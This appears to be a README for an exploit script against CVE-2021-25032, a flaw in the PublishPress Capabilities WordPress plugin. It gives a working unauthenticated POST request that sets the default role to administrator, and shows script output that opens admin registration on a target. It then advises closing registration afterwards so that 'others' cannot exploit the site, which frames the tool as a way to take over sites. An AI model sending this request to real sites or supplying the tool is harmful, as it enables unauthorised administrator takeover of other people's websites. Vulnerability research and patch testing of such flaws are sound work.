# CVE-2021-25032
PublishPress Capabilities 2.2 - 2.3 - Unauthenticated Arbitrary Options Update to Blog Compromise

# Description

The plugin does not have authorisation and CSRF checks when updating the plugin's settings via the init hook, and does not ensure that the options to be updated belong to the plugin. As a result, unauthenticated attackers could update arbitrary blog options, such as the default role and make any new registered user with an administrator role.


Proof of Concept
---
```
POST /wp-admin/admin.php HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 81
Connection: close

page=pp-capabilities-settings&all_options=default_role&default_role=administrator
```

# Example use of script

Enable Register & Admin
---

```
$ python3 CVE-2021-25032.py -u http://wordpress.lan
The plugin version is below 2.3.1.
The plugin version is 2.2
Vulnerability check: http://wordpress.lan
You can now register a user as an admin user. Remember to run --fix yes after you have registered to prevent others exploiting the site.
```

Disable Register & Subscriber
```
$ python3 CVE-2021-25032.py -u http://wordpress.lan --fix yes
Vulnerability check: http://wordpress.lan
Options set successfully: http://wordpress.lan/wp-admin/admin.php
Fixed: You can not longer register
```
